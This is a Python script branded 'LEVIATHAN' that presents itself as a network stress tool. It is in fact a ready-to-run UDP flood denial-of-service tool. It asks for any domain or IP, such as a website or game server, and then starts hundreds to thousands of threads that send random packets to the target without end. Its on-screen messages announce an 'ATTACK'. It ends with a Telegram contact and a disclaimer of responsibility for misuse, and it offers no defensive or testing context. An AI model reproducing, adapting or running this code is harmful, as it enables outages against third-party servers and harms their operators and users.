"""
╔═══════════════════════════════════════════════════════════════╗
║   L E V I A T H A N - High Performance Network Stress Tool     ║
║   Modified for: LEVIATHAN (2025 Edition)                      ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import random
import threading
from platform import system

# --- HIGH-VISUAL HIGHLIGHTED COLORS ---
W = '\033[1;37m'  # White Bold
G = '\033[1;32m'  # Green Bold
R = '\033[1;31m'  # Red Bold
Y = '\033[1;33m'  # Yellow Bold
B = '\033[1;34m'  # Blue Bold
C = '\033[1;36m'  # Cyan Bold
RE = '\033[0m'    # Reset

# Background Highlights
HG = '\033[1;42;30m' # Highlight Green
HR = '\033[1;41;37m' # Highlight Red
HB = '\033[1;44;37m' # Highlight Blue
HC = '\033[1;46;30m' # Highlight Cyan

def clear():
    os.system('cls' if system() == "Windows" else 'clear')

def logo():
    clear()
    print(f"{C}")
    print(r"""
  ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
  ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
  ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
  ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
  ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
  ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ """)
    print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"  {HG}  AUTHOR: LEVIATHAN  {RE}  {HB}  TEAM: LEVIATHAN  {RE}  {HC}  VER: 1.2  {RE}")
    print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}")

# ---------------------------------------------------------
# [!] WORKING PART (MULTI-THREADED ENGINE)
# ---------------------------------------------------------

sent_packets = 0

def leviathan_strike(ip, port, data):
    global sent_packets
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            client.sendto(data, (ip, port))
            sent_packets += 1
            # হাইলাইটেড আউটপুট যা একই লাইনে সংখ্যা আপডেট করবে (ল্যাগ কম হবে)
            print(f"{G}[LEVIATHAN-STRIKE]{W} >> {R}{ip}{W} | {HG} PACKETS SENT: {sent_packets} {RE}", end="\r")
        except:
            pass

# ---------------------------------------------------------

def boot_system():
    clear()
    print(f"\n\n{B}[+] {W}INITIALIZING LEVIATHAN CORE ENGINE...")
    time.sleep(1)
    for i in range(1, 101, 5):
        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
        sys.stdout.flush()
        time.sleep(0.04)
    print(f"\n\n{HG}  SUCCESS: SYSTEM READY FOR ATTACK  {RE}")
    time.sleep(1.5)

# Main Execution
boot_system()

while True:
    logo()
    print(f"\n {G}[01]{W} DOMAIN TARGET (Website)")
    print(f" {G}[02]{W} IP TARGET (Server/Game)")
    print(f" {G}[03]{W} ABOUT LEVIATHAN")
    print(f" {R}[00]{W} EXIT TOOL")
    
    choice = input(f"\n{C}╔═══[{G}Leviathan@Terminal{C}]\n╚══{B}> {Y}")

    if choice == '1':
        domain = input(f"\n{B}[?]{W} DOMAIN: {Y}")
        try:
            target_ip = socket.gethostbyname(domain)
            break
        except:
            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
            time.sleep(2)
    elif choice == '2':
        target_ip = input(f"\n{B}[?]{W} IP ADDRESS: {Y}")
        break
    elif choice == '3':
        logo()
        print(f"\n{HC}  INFORMATION  {RE}")
        print(f"{W}Created by  : {G}LEVIATHAN")
        print(f"{W}Telegram    : {C}@leviathan_official")
        print(f"{W}Disclaimer  : {R}Team LEVIATHAN bears no responsibility for misuse.{RE}")
        input(f"\n{Y}Press Enter to return...")
    elif choice == '0' or choice == '00':
        sys.exit()

# Port & Thread Configuration
logo()
print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
print(f"\n{W}TARGET: {R}{target_ip}")
port = input(f"{W}PORT (Press Enter for 80): {Y}")
port = int(port) if port else 80

threads_count = input(f"{W}THREADS (Power: 500-2000): {Y}")
threads_count = int(threads_count) if threads_count else 800

# Generating Data Payload
payload = random._urandom(1490)

# Final Strike
print(f"\n{HR}  WARNING: ATTACK STARTING IN 3 SECONDS...  {RE}")
time.sleep(3)
logo()

# Launching Threads (The Working Part)
for i in range(threads_count):
    th = threading.Thread(target=leviathan_strike, args=(target_ip, port, payload))
    th.daemon = True
    th.start()

# Keep Main Thread Alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n{HR}  ATTACK TERMINATED BY USER  {RE}")
    print(f"{HC} TOTAL PACKETS SHOT: {sent_packets} {RE}")
    sys.exit()
